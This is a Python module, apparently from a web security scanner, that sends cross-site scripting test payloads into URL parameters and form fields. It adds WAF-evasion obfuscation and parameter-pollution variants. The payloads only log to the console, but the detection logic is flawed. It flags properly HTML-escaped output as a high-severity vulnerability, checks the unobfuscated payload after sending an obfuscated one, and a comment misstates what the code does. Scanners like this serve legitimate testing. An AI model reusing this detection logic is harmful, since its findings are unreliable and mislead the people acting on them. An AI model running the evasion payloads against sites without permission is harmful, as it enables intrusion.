import logging
import random
from urllib.parse import urlparse, parse_qs, quote, urlencode
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union, Tuple

logger = logging.getLogger(__name__)

class XSSScanner:
    def __init__(self, client=None):
        self.client = client if client else HttpClient()
        # General XSS payloads that are effective across sites
        self.payloads = [
            # Basic XSS vectors
            "<script>console.log(1)</script>",  # Simple script tag (less aggressive)
            "<img src=x onerror=console.log(1)>",  # Image error handler
            "<svg onload=console.log(1)>",  # SVG onload event
            
            # Context breaking payloads
            "'><script>console.log(1)</script>",  # Quote breaking + script
            "\"><script>console.log(1)</script>",  # Double quote breaking + script
            "\"'><img src=x onerror=console.log(1)>",  # Mixed quote breaking
            
            # Attribute-based XSS
            "javascript:console.log(1)",  # Javascript protocol
            "' onmouseover='console.log(1)'",  # Event handler injection
            "\" onmouseover=\"console.log(1)\"",  # Event handler with double quotes
            
            # HTML5 vectors
            "<details ontoggle=console.log(1)>",  # Details ontoggle event
            "<body onload=console.log(1)>",  # Body onload event
            
            # WAF evasion techniques
            "<div id=xss>",  # Simple tag that might be reflected
            "')\"><span id=xss>",  # Context breaking with harmless tag
            
            # Encoded payloads for WAF bypass
            "\x3Cimg src=x onerror=console.log(1)\x3E",  # Hex encoded
            "\u003Cimg src=x onerror=console.log(1)\u003E"  # Unicode encoded
        ]
        self.encoding_patterns = [
            r'&lt;script&gt;',
            r'&lt;img',
            r'&lt;svg',
            r'&lt;a',
            r'&lt;body',
            r'&amp;lt;script&amp;gt;',
            r'&amp;lt;img',
            r'&amp;lt;svg',
            r'&amp;lt;a',
            r'&amp;lt;body'
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                for param in params:
                    for payload in self.payloads:
                        try:
                            test_url = self._inject_payload(url, param, payload)
                            response = self.client.get(test_url, timeout=10)
                            
                            if response and self._is_vulnerable(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'XSS',
                                    'url': test_url,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload),
                                    'severity': 'high',
                                    'param': param,
                                    'method': 'GET'
                                })
                        except Exception as e:
                            logger.error(f"XSS GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        for field in form_fields:
                            for payload in self.payloads:
                                try:
                                    test_data = {}
                                    for f in form_fields:
                                        field_name = f.get('name') if isinstance(f, dict) else f
                                        test_data[field_name] = payload if f == field else 'test'
                                    
                                    if method == 'POST':
                                        response = self.client.post(action, data=test_data, timeout=10)
                                    elif method == 'GET':
                                        response = self.client.get(action, params=test_data, timeout=10)
                                    else:
                                        logger.warning(f"Unsupported form method: {method}")
                                        continue
                                    
                                    if response and self._is_vulnerable(response.text, payload):
                                        vulnerabilities.append({
                                            'type': 'XSS',
                                            'url': action,
                                            'payload': payload,
                                            'evidence': self._get_evidence(response.text, payload),
                                            'severity': 'high',
                                            'param': field,
                                            'method': method
                                        })
                                except Exception as e:
                                    logger.error(f"XSS form scan error for field {field}: {str(e)}")
                    except Exception as e:
                        logger.error(f"XSS form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"XSS scan error: {str(e)}")
        
        return vulnerabilities

    def _obfuscate_payload(self, payload: str) -> str:
        """
        Apply various obfuscation techniques to payloads to bypass WAF detection
        """
        techniques = [
            # No obfuscation (original payload)
            lambda p: p,
            
            # Unicode encoding
            lambda p: p.replace("<", "\u003c").replace(">", "\u003e"),
            
            # URL encoding variations
            lambda p: p.replace("<", "%3C").replace(">", "%3E"),
            lambda p: p.replace("<", "%3c").replace(">", "%3e"),
            
            # Double encoding
            lambda p: p.replace("<", "%253C").replace(">", "%253E"),
            
            # Hex encoding
            lambda p: p.replace("<", "\x3c").replace(">", "\x3e"),
            
            # HTML entity encoding
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            
            # Mixed case for tag names (only for script tags)
            lambda p: p.replace("<script", "<sCrIpT").replace("</script", "</sCrIpT") if "script" in p else p,
            
            # Space variations (add tabs or newlines where spaces would work)
            lambda p: p.replace(" ", "\t") if " " in p else p,
            lambda p: p.replace(" ", "\n") if " " in p else p,
            
            # Null byte injection
            lambda p: p.replace("<", "\0<") if "<" in p else p,
        ]
        
        # Apply 1-2 random techniques
        technique = random.choice(techniques)
        return technique(payload)
    
    def _create_polluted_params(self, param: str, value: str) -> List[Dict[str, str]]:
        """
        Create parameter pollution variations to bypass WAF filters
        """
        variations = [
            {param: value},  # Standard
            {param: value, f"{param}[]": value},  # Array notation
            {f"{param}[0]": value},  # Indexed array
            {param: "", f"{param}2": value},  # Duplicate with different name
            {f"{param}.": value},  # Dot notation
            {f"{param}_": value},  # Underscore notation
            {param: "", f"{param}.{random.randint(1, 999)}": value},  # Random dot notation
        ]
        return variations
        
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject a payload into a URL parameter with WAF evasion techniques"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Obfuscate the payload
        obfuscated_payload = self._obfuscate_payload(payload)
        
        # Determine if we should use parameter pollution
        use_pollution = random.random() > 0.7  # 30% chance to use parameter pollution
        
        if use_pollution:
            # Create a copy of the parameters
            new_params = {k: v[0] for k, v in params.items() if k != param}
            
            # Get polluted parameters
            polluted_params = self._create_polluted_params(param, obfuscated_payload)
            polluted_choice = random.choice(polluted_params)
            
            # Add polluted parameters
            new_params.update(polluted_choice)
            
            # Reconstruct the URL with the polluted parameters
            new_query = urlencode(new_params, safe='[]._')
        else:
            # Create a copy of the parameters and inject the payload
            new_params = {k: v[0] for k, v in params.items()}
            new_params[param] = obfuscated_payload
            
            # Reconstruct the URL with the injected payload
            new_query = urlencode(new_params)
        
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        return new_url

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check if payload appears in response without proper encoding
        if payload in response_text:
            return True
            
        # Check for encoded versions of the payload
        for pattern in self.encoding_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        if payload in response_text:
            return "XSS payload found in response without encoding"
            
        for pattern in self.encoding_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return f"Encoded XSS payload found in response: {pattern}"
                
        return "XSS vulnerability detected through response analysis"